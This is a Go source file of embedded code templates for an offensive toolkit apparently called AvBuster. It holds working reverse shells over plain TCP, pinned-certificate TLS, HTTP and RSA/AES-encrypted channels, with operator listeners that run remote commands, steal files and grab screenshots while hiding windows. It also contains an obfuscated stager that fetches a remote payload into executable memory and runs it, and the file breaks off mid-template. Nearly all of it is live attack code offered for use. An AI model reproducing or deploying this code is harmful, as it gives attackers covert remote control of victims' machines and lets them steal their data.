package binarytemplates

var AvBusterCustomGoReverseShell = `package main

import (
	"fmt"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"path/filepath"

	"github.com/kbinani/screenshot"
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512

//MANAGERIP connection string to the manager
const MANAGERIP = "REVIPPORT"

func main() {

	conn, err := net.Dial("tcp", MANAGERIP)
	if err != nil {
		fmt.Println(err)
	}

	getshell(conn)

}

func getshell(conn net.Conn) {
	var cmdbuff []byte
	var command string
	cmdbuff = make([]byte, BUFFSIZE)
	var osshell string
	for {
		recvdbytes, _ := conn.Read(cmdbuff[0:])
		command = string(cmdbuff[0:recvdbytes])
		if strings.Index(command, "bye") == 0 {
			conn.Write([]byte("Shell Disconnected"))
			conn.Close()
			os.Exit(0)
		} else if strings.Index(command, "get") == 0 {
			fname := strings.Split(command, " ")[1]
			fmt.Println(fname)
			finflag := make(chan string)
			go sendFile(conn, fname, finflag)
			//<-finflag

		} else if strings.Index(command, "grabscreen") == 0 {
			filenames := getscreenshot()
			finflag := make(chan string)
			for _, fname := range filenames {
				go sendFile(conn, fname, finflag)
				<-finflag
				go removetempimages(filenames, finflag)
				//<-finflag

			}

		} else {
			//endcmd := "END"
			j := 0
			osshellargs := []string{"/C", command}

			if runtime.GOOS == "linux" {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}

			} else {
				osshell = "cmd"
				//cmdout, _ := exec.Command("cmd", "/C", command).Output()
			}
			execcmd := exec.Command(osshell, osshellargs...)

			/*if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}*/

			cmdout, _ := execcmd.Output()
			if len(cmdout) <= 512 {
				conn.Write([]byte(cmdout))
				//conn.Write([]byte(endcmd))
			} else {

				i := BUFFSIZE
				for {
					if i > len(cmdout) {

						conn.Write(cmdout[j:len(cmdout)])
						break
					} else {

						conn.Write(cmdout[j:i])
						j = i
					}
					i = i + BUFFSIZE
				}

			}

			cmdout = cmdout[:0]
		}

	}
}

func removetempimages(filenames []string, finflag chan string) {
	for _, name := range filenames {
		os.Remove(name)
	}
}

func sendFile(revConn net.Conn, fname string, finflag chan string) {

	file, _ := os.Open(strings.TrimSpace(fname))
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}
	fileSize := padString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := padString(fileInfo.Name(), 64)
	//Sending filename and filesize
	revConn.Write([]byte(fileSize))
	revConn.Write([]byte(fileName))
	sendBuffer := make([]byte, BUFFSIZE)
	//sending file contents
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		revConn.Write(sendBuffer)
	}
	finflag <- "file sent"

	//Completed file sending
	return
}

func padString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}
func getscreenshot() []string {
	n := screenshot.NumActiveDisplays()
	filenames := []string{}
	var fpth string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		if runtime.GOOS == "windows" {
			fpth = filepath.FromSlash("C:\\Windows\\Temp\\")
		} else {
			fpth = filepath.FromSlash("//tmp//")
		}
		fileName := fmt.Sprintf("Scr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
		filenames = append(filenames, fullpath)
		file, _ := os.Create(fullpath)

		defer file.Close()
		png.Encode(file, img)

		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
	}
	return filenames
}`
var AvBusterCustomGoReverseShellManager = `package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

// FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
const FILEREADBUFFSIZE = 512

//PORT set server port here
const LOCALPORT = ":REVPRT"

func main() {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	cyanc := color.New(color.FgCyan, color.Bold)

	var recvdcmd [512]byte //stores output from reverse shell
	//sleepy := html.UnescapeString("&#" + strconv.Itoa(128564) + ";") //emoticons https://apps.timwhitlock.info/emoji/tables/unicode
	//sleepy := emoji.Sprint(":sleeping:")

	cyanc.Println("Not Yet Connected ...")
	listner, _ := net.Listen("tcp", LOCALPORT)
	conn, _ := listner.Accept()
	for {
		reader := bufio.NewReader(os.Stdin)
		redc.Print("[AvBusterTCP]~# : ")
		command, _ := reader.ReadString('\n')
		if strings.Compare(command, "bye") == 0 {
			conn.Write([]byte(command))
			conn.Close()
			os.Exit(1)
		} else if strings.Index(command, "get") == 0 {
			getFilewithNameandSize(conn, command)

		} else if strings.Index(command, "grabscreen") == 0 {
			getFilewithNameandSize(conn, command)

		} else {
			conn.Write([]byte(command))
			for {
				chunkbytes, _ := conn.Read(recvdcmd[0:])
				//fmt.Println(string(recvdcmd[0:n]))
				//if string(recvdcmd[0:n]) == "END"
				if chunkbytes < 512 {
					//finaloutput = string(recvdcmd[0:chunkbytes]) + finaloutput
					greenc.Println(string(recvdcmd[0:chunkbytes]))
					break
				} else {
					greenc.Println(string(recvdcmd[0:chunkbytes]))

				}
			}
		}

	}

}

func getFilewithNameandSize(connection net.Conn, command string) {

	connection.Write([]byte(command))

	bufferFileName := make([]byte, 64)
	bufferFileSize := make([]byte, 10)

	connection.Read(bufferFileSize)

	fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
	fmt.Println("file size ", fileSize)

	connection.Read(bufferFileName)
	fileName := strings.Trim(string(bufferFileName), ":")

	fmt.Println("file name ", fileName)

	newFile, err := os.Create(fileName)

	if err != nil {
		fmt.Println(err)
	}
	defer newFile.Close()
	var receivedBytes int64

	for {
		if (fileSize - receivedBytes) < FILEREADBUFFSIZE {
			io.CopyN(newFile, connection, (fileSize - receivedBytes))
			connection.Read(make([]byte, (receivedBytes+FILEREADBUFFSIZE)-fileSize))
			break
		}
		io.CopyN(newFile, connection, FILEREADBUFFSIZE)
		receivedBytes += FILEREADBUFFSIZE
	}
	fmt.Println("File Download Completed ! ")
	return
}`

var AvBusterPinnedCertReverseShell = `package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"path/filepath"
	"github.com/kbinani/screenshot"
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512

//MASKMANAGERIP connection string to the maskmanager
const MASKMANAGERIP = "REVIPPORT"

//PINNEDCERT fingerprint pinning to escape from MITM
const PINNEDKEY = "FPRINT"

func main() {
	fingerprint := strings.Replace(PINNEDKEY, ":", "", -1)
	fingerprintbytes, err := hex.DecodeString(fingerprint)
	if err != nil {
		fmt.Println(err)
	}
	tlsconfig := &tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", MASKMANAGERIP, tlsconfig)
	if err != nil {
		fmt.Println(err)
	}
	pinnedcertmatched := pinnedcertcheck(conn, fingerprintbytes)
	if pinnedcertmatched {
		getmaskedshell(conn)
	} else {
		fmt.Println("cert problem")
		os.Exit(1)
	}

}

func pinnedcertcheck(conn *tls.Conn, pinnedcert []byte) bool {
	certmatched := false
	for _, peercert := range conn.ConnectionState().PeerCertificates {
		//pubkeybytes, err := x509.MarshalPKIXPublicKey(peercert.PublicKey)
		hash := sha256.Sum256(peercert.Raw)
		if bytes.Compare(hash[0:], pinnedcert) == 0 {
			certmatched = true
		}
	}
	return certmatched
}

func getscreenshot() []string {
	n := screenshot.NumActiveDisplays()
	filenames := []string{}
	var fpth string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		if runtime.GOOS == "windows" {
			fpth = filepath.FromSlash("C:\\Windows\\Temp\\")
		} else {
			fpth = filepath.FromSlash("//tmp//")
		}
		fileName := fmt.Sprintf("maskScr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
		filenames = append(filenames, fullpath)
		file, _ := os.Create(fullpath)

		defer file.Close()
		png.Encode(file, img)

		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
	}
	return filenames
}

func getmaskedshell(conn *tls.Conn) {
	var cmdbuff []byte
	var command string
	cmdbuff = make([]byte, BUFFSIZE)
	var osshell string
	//fmt.Println("Welcome to Mask")
	for {
		recvdbytes, _ := conn.Read(cmdbuff[0:])
		command = string(cmdbuff[0:recvdbytes])
		if strings.Index(command, "bye") == 0 {
			conn.Write([]byte("Good Bye !"))
			conn.Close()
			os.Exit(0)
		} else if strings.Index(command, "get") == 0 {
			fname := strings.Split(command, " ")[1]
			fmt.Println(fname)
			finflag := make(chan string)
			go sendFile(conn, fname, finflag)
			//<-finflag

		} else if strings.Index(command, "grabscreen") == 0 {
			filenames := getscreenshot()
			finflag := make(chan string)
			for _, fname := range filenames {
				go sendFile(conn, fname, finflag)
				<-finflag
				go removetempimages(filenames, finflag)
				//<-finflag

			}

		} else {
			//endcmd := "END"
			j := 0
			osshellargs := []string{"/C", command}

			if runtime.GOOS == "linux" {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}

			} else {
				osshell = "cmd"
				//cmdout, _ := exec.Command("cmd", "/C", command).Output()
			}
			execcmd := exec.Command(osshell, osshellargs...)

			if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}

			cmdout, _ := execcmd.Output()
			if len(cmdout) <= 512 {
				conn.Write([]byte(cmdout))
				//conn.Write([]byte(endcmd))
			} else {
				//fmt.Println(len(cmdout))
				//fmt.Println(string(cmdout))
				//fmt.Println("Length of string :")
				//fmt.Println(len(string(cmdout)))
				i := BUFFSIZE
				for {
					if i > len(cmdout) {
						//fmt.Println("From " + strconv.Itoa(j) + "to" + strconv.Itoa(len(cmdout)))
						//fmt.Println(string(cmdout[j:len(cmdout)]))
						conn.Write(cmdout[j:len(cmdout)])
						break
					} else {
						//fmt.Println("From " + strconv.Itoa(j) + "to" + strconv.Itoa(i))
						//fmt.Println(string(cmdout[j:i]))
						conn.Write(cmdout[j:i])
						j = i
					}
					i = i + BUFFSIZE
				}

			}

			cmdout = cmdout[:0]
		}

	}
}

func removetempimages(filenames []string, finflag chan string) {
	for _, name := range filenames {
		os.Remove(name)
	}
}

func sendFile(revConn net.Conn, fname string, finflag chan string) {

	file, _ := os.Open(strings.TrimSpace(fname))
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}
	fileSize := padString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := padString(fileInfo.Name(), 64)
	//Sending filename and filesize
	revConn.Write([]byte(fileSize))
	revConn.Write([]byte(fileName))
	sendBuffer := make([]byte, BUFFSIZE)
	//sending file contents
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		revConn.Write(sendBuffer)
	}
	finflag <- "file sent"

	//Completed file sending
	return
}

func padString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}`

var AvBusterPinnedCertReverseShellManager = `package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

// FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
const FILEREADBUFFSIZE = 512

//PORT set server port here
const LOCALPORT = ":REVPRT"

func main() {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	cyanc := color.New(color.FgCyan, color.Bold)

	var recvdcmd [512]byte //stores output from reverse shell
	cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		fmt.Println(err)
	}
	tlsconfig := &tls.Config{Certificates: []tls.Certificate{cert}}
	cyanc.Println("Wait ... ZzzZZ")
	listner, _ := tls.Listen("tcp", LOCALPORT, tlsconfig)
	conn, _ := listner.Accept()
	for {
		reader := bufio.NewReader(os.Stdin)
		redc.Print("[AvBusterPinnedCertShell]~# : ")
		command, _ := reader.ReadString('\n')
		if strings.Compare(command, "bye") == 0 {
			conn.Write([]byte(command))
			conn.Close()
			os.Exit(1)
		} else if strings.Index(command, "get") == 0 {
			getFilewithNameandSize(conn, command)

		} else if strings.Index(command, "grabscreen") == 0 {
			getFilewithNameandSize(conn, command)

		} else {
			conn.Write([]byte(command))
			for {
				chunkbytes, _ := conn.Read(recvdcmd[0:])
				//fmt.Println(string(recvdcmd[0:n]))
				//if string(recvdcmd[0:n]) == "END"
				if chunkbytes < 512 {
					//finaloutput = string(recvdcmd[0:chunkbytes]) + finaloutput
					greenc.Println(string(recvdcmd[0:chunkbytes]))
					break
				} else {
					greenc.Println(string(recvdcmd[0:chunkbytes]))

				}
			}
		}

	}

}

func getFilewithNameandSize(connection net.Conn, command string) {

	connection.Write([]byte(command))

	bufferFileName := make([]byte, 64)
	bufferFileSize := make([]byte, 10)

	connection.Read(bufferFileSize)

	fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
	fmt.Println("file size ", fileSize)

	connection.Read(bufferFileName)
	fileName := strings.Trim(string(bufferFileName), ":")

	fmt.Println("file name ", fileName)

	newFile, err := os.Create(fileName)

	if err != nil {
		fmt.Println(err)
	}
	defer newFile.Close()
	var receivedBytes int64

	for {
		if (fileSize - receivedBytes) < FILEREADBUFFSIZE {
			io.CopyN(newFile, connection, (fileSize - receivedBytes))
			connection.Read(make([]byte, (receivedBytes+FILEREADBUFFSIZE)-fileSize))
			break
		}
		io.CopyN(newFile, connection, FILEREADBUFFSIZE)
		receivedBytes += FILEREADBUFFSIZE
	}
	fmt.Println("File Download Completed ! ")
	return
}`

var AvBusterHttpReverseShell = `package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/PuerkitoBio/goquery"
)

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {

	var osshell string
	//var osshellargs []string
	revserver := "http://REVIPPORT"

	client := &http.Client{}

	for {

		response, err := client.Get(revserver)
		checkerr(err)
		defer response.Body.Close()
		//cnt2, _ := ioutil.ReadAll(response.Body)
		//fmt.Println(string(cnt2))

		doc, err := goquery.NewDocumentFromResponse(response)
		checkerr(err)
		cnt, _ := doc.Find("form input").Attr("value")

		if strings.TrimSpace(cnt) == "" {
			cnt = "ipconfig"
		}
		command := strings.TrimSpace(string(cnt))
		//fmt.Println("Go query")
		//fmt.Println(command)

		if command == "bye" {
			client.PostForm(revserver, url.Values{"cmd": {command}, "cmdres": {"Bye for now !"}})
			os.Exit(0)
		} else {
			osshellargs := []string{"/C", command}
			if runtime.GOOS == "windows" {
				osshell = "cmd"
			} else {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}
			}
			execcmd := exec.Command(osshell, osshellargs...)
			if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}

			out, _ := execcmd.Output()
			//fmt.Println(string(out))
			client.PostForm(revserver, url.Values{"cmd": {command}, "cmdres": {string(out)}})
			//client.PostForm(revserver, url.Values{"cmd": {command}})
			time.Sleep(3 * time.Second)
		}

	}

}`

var AvBusterHttpReverseShellManager = `package main

import (
	"bufio"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"github.com/fatih/color"
)

type ServCommand struct {
	Command    string
	Commandres string
}

var commandtopost ServCommand
var servtemplate *template.Template
var owntemplate string

func init() {
	owntemplate = RPL<!DOCTYPE html>
	<html>
	<body>
	<form action="" method="post" id="cmdform" name="cmdform">
		<input type="text" class="form-control" name="cmd" id="cmd" value= {{.Command}}>
	</form>
	</body>
	</html>RPL
}

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	templategeneration()
	commandtopost = ServCommand{}
	servtemplate = template.Must(template.ParseFiles("owntemplate.html"))
	http.HandleFunc("/", index)
	err := http.ListenAndServe(":REVPRT", nil)
	checkerr(err)
}

func index(respwrt http.ResponseWriter, req *http.Request) {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	//cyanc := color.New(color.FgCyan, color.Bold)
	if req.Method == "POST" {
		err := req.ParseForm()
		checkerr(err)
		cmdres := req.Form.Get("cmdres")
		commandtopost.Commandres = cmdres
		redc.Println("Message from AVBUSTER TUNNEL...")
		greenc.Println(commandtopost.Commandres)
		err = servtemplate.Execute(respwrt, commandtopost)
		checkerr(err)

		//content, _ := ioutil.ReadAll(req.Body)
		//fmt.Println(string(content))
	} else {
		redc.Printf("[AvBuster")
		greenc.Printf("HTTP")
		redc.Printf("Tunnel]~# :")
		reader := bufio.NewReader(os.Stdin)
		cmdtopost, _ := reader.ReadString('\n')
		//cyanc.Println("You sent " + "\"" + strings.TrimRight(cmdtopost, "\r\n") + "\"" + " to client.")
		commandtopost.Command = cmdtopost
		err := servtemplate.Execute(respwrt, commandtopost)
		checkerr(err)
	}
}
func templategeneration() {
	if !fileexists("owntemplate.html") {
		templatefile, err := os.Create("owntemplate.html")
		if err != nil {
			fmt.Println(err)
		}
		templatefile.WriteString(owntemplate)
		templatefile.Close()
	}
}
func fileexists(fname string) bool {
	_, err := os.Stat(fname)
	var exists bool
	if err == nil {
		exists = true
	} else if os.IsNotExist(err) {
		exists = false
	}
	return exists
}
`

var AvBusterTCPHybridReverseShell = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512

//MASKMANAGERIP connection string to the maskmanager
const MASKMANAGERIP = "REVIPPORT"

//PUBLIC KEY
var MNGRPUBLICKEY = []byte(RPLPUBKEYRPL)

//PRIVATE KEY
var PRIVATEKEY = []byte(RPLPVTKEYRPL)

func main() {
	conn, err := net.Dial("tcp", MASKMANAGERIP)
	if err != nil {
		fmt.Println(err)
	}
	getmaskedshell(conn)

}

func encryptconnection(keyval, texttoencrypt string) string {
	//fmt.Println("Encryption Program v0.01")

	text := []byte(texttoencrypt)
	key := []byte(keyval)

	// generate a new aes cipher using our 32 byte long key
	cipherBlock, err := aes.NewCipher(key)
	// if there are any errors, handle them
	if err != nil {
		fmt.Println(err)
	}

	// gcm or Galois/Counter Mode, is a mode of operation
	// for symmetric key cryptographic block ciphers
	// - https://en.wikipedia.org/wiki/Galois/Counter_Mode
	gcm, err := cipher.NewGCM(cipherBlock)
	// if any error generating new GCM
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	// creates a new byte array the size of the nonce
	// which must be passed to Seal
	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	// here we encrypt our text using the Seal function
	// Seal encrypts and authenticates plaintext, authenticates the
	// additional data and appends the result to dst, returning the updated
	// slice. The nonce must be NonceSize() bytes long and unique for all
	// time, for a given key.
	return string(gcm.Seal(nonce, nonce, text, nil))
}

func decryptconnection(keyval, texttodecrypt string) string {
	key := []byte(keyval)
	ciphertext := []byte(texttodecrypt)
	// if our program was unable to read the file
	// print out the reason why it can't
	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}
	return (string(plaintext))
}

func encryptMessage(origData []byte) ([]byte, error) {
	block, _ := pem.Decode(MNGRPUBLICKEY)
	if block == nil {
		return nil, errors.New("public key error")
	}
	pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	pub := pubInterface.(*rsa.PublicKey)
	return rsa.EncryptPKCS1v15(rand.Reader, pub, origData)
}

func decryptMessage(ciphertext []byte) ([]byte, error) {
	block, _ := pem.Decode(PRIVATEKEY)
	if block == nil {
		return nil, errors.New("private key error!")
	}
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	return rsa.DecryptPKCS1v15(rand.Reader, priv, ciphertext)
}

func getmaskedshell(conn net.Conn) {
	var keybuff, cmdbuff []byte
	var command string
	cmdbuff = make([]byte, BUFFSIZE)
	keybuff = make([]byte, 1024)
	var osshell string
	//fmt.Println("Welcome to Mask")

	keybytes, _ := conn.Read(keybuff[0:])
	decryptedkey, err := decryptMessage(keybuff[0:keybytes])
	if err != nil {
		fmt.Println(err)
	}
	keyval := string(decryptedkey)

	for {
		recvdbytes, _ := conn.Read(cmdbuff[0:])
		decryptedcmd := decryptconnection(keyval, string(cmdbuff[0:recvdbytes]))
		command = string(decryptedcmd)
		//fmt.Println(command)
		if strings.Index(command, "bye") == 0 {
			msgtoencrypt := "Good Bye :("
			result := encryptconnection(keyval, msgtoencrypt)
			if err != nil {
				fmt.Println(err)
			}
			conn.Write([]byte(result))
			conn.Close()
			os.Exit(0)
		} else {
			j := 0

			osshellargs := []string{"/C", command}

			if runtime.GOOS == "linux" {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}

			} else {
				osshell = "cmd"
			}
			execcmd := exec.Command(osshell, osshellargs...)

			if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}

			cmdout, _ := execcmd.Output()
			encresult := encryptconnection(keyval, string(cmdout))
			actualres := []byte(encresult)
			//fmt.Println(decryptconnection(keyval, string(actualres)))
			if len(actualres) <= 512 {
				conn.Write([]byte(actualres))
			} else {

				i := BUFFSIZE
				for {
					if i > len(actualres) {
						conn.Write(actualres[j:len(actualres)])
						break
					} else {

						conn.Write(actualres[j:i])
						j = i
					}
					i = i + BUFFSIZE
				}

			}
			actualres = actualres[:0]
			cmdout = cmdout[:0]
		}

	}
}`

var AvBusterTCPHybridReverseShellManager = `package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	mathrand "math/rand"
	"net"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
)

// FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
const FILEREADBUFFSIZE = 512

const LOCALPORT = ":REVPRT"
//const LOCALPORT = ":443"

var SHELLPUBLICKEY = []byte(RPLPUBKEYRPL)

func main() {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	cyanc := color.New(color.FgCyan, color.Bold)
	var recvdcmd [512]byte
	cyanc.Println("AvBuster Encrypted Tunnell...")
	listner, _ := net.Listen("tcp", LOCALPORT)
	conn, _ := listner.Accept()
	keyval := generateKey()
	encmsg, _ := encryptMessage([]byte(keyval))
	//fmt.Println(keyval)
	conn.Write(encmsg)
	for {
		reader := bufio.NewReader(os.Stdin)
		redc.Print("[AvBusterEncryptedTunnel]~# : ")
		command, _ := reader.ReadString('\n')
		if strings.Compare(command, "bye") == 0 {
			encmsg := []byte(encryptconnection(keyval, command))
			conn.Write(encmsg)
			conn.Close()
			os.Exit(1)
		} else {
			encmsg := []byte(encryptconnection(keyval, command))
			conn.Write(encmsg)
			alldata := make([]byte, 0, 4096) // big buffer

			for {
				chunkbytes, _ := conn.Read(recvdcmd[0:])
				if chunkbytes < 512 {
					//greenc.Println(string(recvdcmd[0:chunkbytes]))
					alldata = append(alldata, recvdcmd[:chunkbytes]...)
					break
				} else {
					//greenc.Println(string(recvdcmd[0:chunkbytes]))
					alldata = append(alldata, recvdcmd[:chunkbytes]...)

				}
			}

			greenc.Println(decryptconnection(keyval, string(alldata)))

		}

	}

}

func encryptconnection(keyval, texttoencrypt string) string {
	//fmt.Println("Encryption Program v0.01")

	text := []byte(texttoencrypt)
	key := []byte(keyval)

	// generate a new aes cipher using our 32 byte long key
	cipherBlock, err := aes.NewCipher(key)
	// if there are any errors, handle them
	if err != nil {
		fmt.Println(err)
	}

	// gcm or Galois/Counter Mode, is a mode of operation
	// for symmetric key cryptographic block ciphers
	// - https://en.wikipedia.org/wiki/Galois/Counter_Mode
	gcm, err := cipher.NewGCM(cipherBlock)
	// if any error generating new GCM
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	// creates a new byte array the size of the nonce
	// which must be passed to Seal
	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	// here we encrypt our text using the Seal function
	// Seal encrypts and authenticates plaintext, authenticates the
	// additional data and appends the result to dst, returning the updated
	// slice. The nonce must be NonceSize() bytes long and unique for all
	// time, for a given key.
	return string(gcm.Seal(nonce, nonce, text, nil))
}
func generateKey() string {
	mathrand.Seed(time.Now().UnixNano())
	var keychars = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~@#$%^&*()-_=+;:?")
	randomkey := make([]rune, 32)
	for i := range randomkey {
		randomkey[i] = keychars[mathrand.Intn(len(keychars))]
	}
	return string(randomkey)
}

func encryptMessage(origData []byte) ([]byte, error) {
	block, _ := pem.Decode(SHELLPUBLICKEY)
	if block == nil {
		return nil, errors.New("public key error")
	}
	pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	pub := pubInterface.(*rsa.PublicKey)
	return rsa.EncryptPKCS1v15(rand.Reader, pub, origData)
}

func decryptconnection(keyval, texttodecrypt string) string {
	key := []byte(keyval)
	ciphertext := []byte(texttodecrypt)
	// if our program was unable to read the file
	// print out the reason why it can't
	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}
	return (string(plaintext))
}`

var AvBusterHttpsMeterPreterShell = `package main

import (
	"crypto/tls"
	"io/ioutil"
	"math/rand"
	"net/http"
	"syscall"
	"time"
	"unsafe"
)

var (
	BJyQRxx        = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
	pYMFdBjbSa     = syscall.NewLazyDLL("kernel32.dll")
	ZfYBeZAwhLGVCi = pYMFdBjbSa.NewProc("HeapCreate")
	NFgqWNprwn     = pYMFdBjbSa.NewProc("HeapAlloc")
)

func vbNnkRqIKJjoiiy(zgSdYoPyPngVpa uintptr) (uintptr, error) {
	zybVOWnivd, _, _ := ZfYBeZAwhLGVCi.Call(0x00040000, zgSdYoPyPngVpa, 0)
	GSJguXKF, _, _ := NFgqWNprwn.Call(zybVOWnivd, 0x00000008, zgSdYoPyPngVpa)
	if GSJguXKF == 0 {
		return 0, nil
	}
	return GSJguXKF, nil
}
func zfRbWRTglU(tGrloqk int, zNuggNPZo []byte) string {
	DOWIcn := rand.New(rand.NewSource(time.Now().UnixNano()))
	var XNFepYCrN []byte
	for YDlDmTwPwQLS := 0; YDlDmTwPwQLS < tGrloqk; YDlDmTwPwQLS++ {
		XNFepYCrN = append(XNFepYCrN, zNuggNPZo[DOWIcn.Intn(len(zNuggNPZo))])
	}
	return string(XNFepYCrN)
}
func wnJAnr(tGrloqk int) string {
	zNuggNPZo := []byte(BJyQRxx)
	return zfRbWRTglU(tGrloqk, zNuggNPZo)
}
func GCVQeHOtb(hDPrqfO, tGrloqk int) string {
	for {
		rTumlWsp := 0
		FevxLalJuLN := wnJAnr(tGrloqk)
		for _, dJrBBcfQ := range []byte(FevxLalJuLN) {
			rTumlWsp += int(dJrBBcfQ)
		}
		if rTumlWsp%0x100 == hDPrqfO {
			return "/" + FevxLalJuLN
		}
	}
}
func main() {
	PryCgiiZsjNE := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	ttSZNuLlsgrWRdf := http.Client{Transport: PryCgiiZsjNE}
	lpklyrWfYIx := "https://REVIPPORT"
	gKLxfLnLqzde, _ := ttSZNuLlsgrWRdf.Get(lpklyrWfYIx + GCVQeHOtb(92, 30))
	defer gKLxfLnLqzde.Body.Close()
	JdxPBJgfHDGq, _ := ioutil.ReadAll(gKLxfLnLqzde.Body)
	GSJguXKF, _ := vbNnkRqIKJjoiiy(uintptr(len(JdxPBJgfHDGq)))
	fsoUfeev := (*[990000]byte)(unsafe.Pointer(GSJguXKF))
	for LSjWSoUKjPpYjS, dJrBBcfQ := range JdxPBJgfHDGq {
		fsoUfeev[LSjWSoUKjPpYjS] = dJrBBcfQ
	}
	syscall.Syscall(GSJguXKF, 0, 0, 0, 0)
}
`
var AvBusterHttpMeterPreterShell = `package main

import (
	"io/ioutil"
	"math/rand"
	"net/http"
	"syscall"
	"time"
	"unsafe"
)

const (
	dlIyxUBZRDOnxIB = 0x1000
	oMuJfGUDmtCSRG  = 0x2000
